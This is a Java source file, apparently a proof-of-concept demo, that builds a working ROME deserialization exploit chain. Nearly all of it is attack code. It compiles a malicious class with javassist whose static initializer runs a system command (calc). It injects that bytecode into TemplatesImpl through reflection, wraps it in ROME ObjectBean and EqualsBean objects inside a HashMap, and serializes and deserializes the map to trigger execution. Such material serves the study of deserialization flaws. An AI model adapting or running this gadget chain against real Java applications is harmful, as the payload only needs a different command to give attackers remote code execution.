package rome;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;


import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;

public class Demo {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NotFoundException, CannotCompileException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        //构造恶意类
        ClassPool pool = ClassPool.getDefault();
        CtClass abstractTranslet = pool.get(AbstractTranslet.class.getName());
        CtClass clazz = pool.makeClass("evil");
        String cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"calc\"});";
        clazz.makeClassInitializer().insertBefore(cmd);
        clazz.setSuperclass(abstractTranslet);

        TemplatesImpl templates = new TemplatesImpl();
        Class aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field bytecodes = aClass.getDeclaredField("_bytecodes");
        Field name = aClass.getDeclaredField("_name");
        Field tfactory = aClass.getDeclaredField("_tfactory");
        bytecodes.setAccessible(true);
        name.setAccessible(true);
        tfactory.setAccessible(true);
        bytecodes.set(templates,new byte[][]{clazz.toBytecode()});
        name.set(templates,"xsw6");
//        tfactory.set(templates,new TransformerFactoryImpl());


        //Rome利用
        ObjectBean delegate = new ObjectBean(Templates.class, templates);

        ObjectBean root = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "xsw6"));

        HashMap<Object, Object> map = new HashMap<>();
        map.put(root, "xs");

        Field field = ObjectBean.class.getDeclaredField("_equalsBean");
        field.setAccessible(true);
        field.set(root, new EqualsBean(ObjectBean.class, delegate));

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(map);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();


    }

}
